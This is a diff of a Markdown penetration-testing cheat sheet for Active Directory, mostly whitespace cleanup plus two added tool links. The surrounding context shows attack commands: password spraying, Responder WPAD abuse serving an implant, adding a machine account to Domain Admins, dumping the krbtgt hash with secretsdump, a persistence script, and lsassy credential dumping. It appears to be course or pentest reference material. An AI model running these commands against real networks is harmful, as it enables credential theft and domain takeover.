@@ -54,7 +54,7 @@ grep PASSWD_NOTREQD domain_users.grep | grep -v ACCOUNT_DISABLED | awk -F ';' '{
 
 Reset password of users who have PASSWD_NOTREQD flag set and have never set a password:
 ```
-Get-ADUser -Filter "useraccountcontrol -band 32" -Properties PasswordLastSet | Where-Object { $_.PasswordLastSet -eq $null } | select SamAccountName,Name,distinguishedname | Out-GridView 
+Get-ADUser -Filter "useraccountcontrol -band 32" -Properties PasswordLastSet | Where-Object { $_.PasswordLastSet -eq $null } | select SamAccountName,Name,distinguishedname | Out-GridView
 ```
 
 ### Machine Account Quota
@@ -132,6 +132,9 @@ python pywerview.py get-netuser -w company.local -u jdoe --dc-ip 192.168.0.10 --
 
 # Exploitation
 
+### adPeas
+- https://github.com/61106960/adPEAS
+
 ### Password spray
 - https://github.com/Greenwolf/Spray/blob/master/spray.sh
 
@@ -149,7 +152,7 @@ spray.sh -smb 192.168.0.10 users.txt seasons.txt 3 15 cema.canadaegg.ca NOUSERUS
 ### GPP / GPO passwords
 
 ### LLMNR / NBT-NS / mDNS
-> Microsoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network. 
+> Microsoft systems use Link-Local Multicast Name Resolution (LLMNR) and the NetBIOS Name Service (NBT-NS) for local host resolution when DNS lookups fail. Apple Bonjour and Linux zero-configuration implementations use Multicast DNS (mDNS) to discover systems within a network.
 
 ### WPAD
 Many browsers use Web Proxy Auto-Discovery (WPAD) to load proxy settings from the network, download the wpad.dat, Proxy Auto-Config (PAC) file.
@@ -169,10 +172,10 @@ Modify Responder configuration file
 ```
 ; Set to On to serve the custom HTML if the URL does not contain .exe
 ; Set to Off to inject the 'HTMLToInject' in web pages instead
-Serve-Html = On 
+Serve-Html = On
 ```
 
---> Create a specific web page for error or use the default one. 
+--> Create a specific web page for error or use the default one.
 
 --> Create an implant to be downloaded by the client. By default the error message indicate this URL : ```http://isaProxysrv/ProxyClient.exe```
 
@@ -202,12 +205,12 @@ Various tools exist which can create a machine account from the command line or 
 7. userAccountControl
 8. msDS-AdditionalDnsHostName
 9. msDS-AllowedToActOnBehalfOfOtherIdentity
-10. samAccountName 
+10. samAccountName
 
 - The machine account itself has write access to some of its own attributes. The list includes the msDS-SupportedEncryptionTypes attribute which can have an impact on the negotiated Kerberos encryption method.
 
 - The samAccountName can be changed to anything that doesn’t match a samAccountName already present in a domain.
---> Interestingly, the samAccountName can even end in a space which permits mimicking any existing domain account. You can strip the $ character also. 
+--> Interestingly, the samAccountName can even end in a space which permits mimicking any existing domain account. You can strip the $ character also.
 
 <img src="./images/MAQSAMAccoutnName.png" width="250"/>
 
@@ -347,7 +350,7 @@ net group "Domain Admins" newMachine01$ /add /domain
 python3 secretsdump.py company.local/newMachine01\$:Password123@10.0.0.1 -just-dc-user krbtgt
 ```
 
-#### Machine/Computer accounts 2 
+#### Machine/Computer accounts 2
 - https://stealthbits.com/blog/server-untrust-account/
 - https://github.com/STEALTHbits/ServerUntrustAccount
 - https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/
@@ -368,7 +371,7 @@ New-MachineAccount -MachineAccount newMachine01 -Domain company.local -DomainCon
 ```
 By default new computer will have primary group ID 515 (RID for domain groups and represents that this is a domain computer)
 
-If you can modify the **userAccountControl** an therefore change the primary group ID. This attribute would be modified to have a value of **8192** the primary group id will change to **516** which belongs to domain controllers. 
+If you can modify the **userAccountControl** an therefore change the primary group ID. This attribute would be modified to have a value of **8192** the primary group id will change to **516** which belongs to domain controllers.
 
 ```
 Set-ADComputer newMachine01 -replace @{ "userAccountcontrol" = 8192 }
@@ -392,7 +395,7 @@ Invoke-ServerUntrustAccount -ComputerName "newMachine01" -Password "Password123"
 ```
 
 **Automate technique 2:**
-PowerShell script to automate domain persistence via the userAccountControl active directory attribute. 
+PowerShell script to automate domain persistence via the userAccountControl active directory attribute.
 ```
 function Execute-userAccountControl
 {
@@ -408,7 +411,7 @@ $MachineAccount = 'Pentestlab'
         )
 $secureString = convertto-securestring "Password123" -asplaintext -force
 $VerbosePreference = "Continue"
- 
+
 Write-Verbose -Message "Creating Computer Account: $ComputerName"
 New-ADComputer $ComputerName -AccountPassword $securestring -Enabled $true -OperatingSystem $OS -OperatingSystemVersion $OS_Version -DNSHostName
 $DNSName -ErrorAction Stop;
@@ -457,7 +460,7 @@ Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 lsassy -d company.local -u jdoe -p Pass1234 192.168.1.0/24
 ```
 
-## Misc : AD Audit 
+## Misc : AD Audit
 #### LM password storage
 LM hash is an old deprecated method of storing passwords which has the following weaknesses:  
 - Password length is limited to 14 characters
@@ -512,6 +515,9 @@ Data exfiltration and DLP (Data Loss Prevention) bypass.
 ### Resources
 #### PetitPotam and ADCS
 - https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services
+
+#### Active Directory Exploitation cheatsheet
+- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
 
 
 To use for the course
